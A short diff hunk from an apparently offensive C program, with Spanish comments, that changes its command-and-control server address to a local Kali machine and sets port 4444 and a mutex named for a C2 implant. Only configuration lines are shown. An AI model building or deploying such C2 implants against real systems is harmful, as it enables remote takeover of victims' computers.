@@ -36,7 +36,7 @@
 // ============================================================================
 // CONFIGURACIÓN - CAMBIA ESTA IP POR LA DE TU KALI
 // ============================================================================
-#define C2_SERVER "192.168.254.1"  // CAMBIA A TU IP
+#define C2_SERVER "192.168.254.137"  // CAMBIA A TU IP
 #define C2_PORT 4444
 #define MUTEX_NAME "Global\\JDEXPLOIT_C2"
 #define BUFFER_SIZE 8192
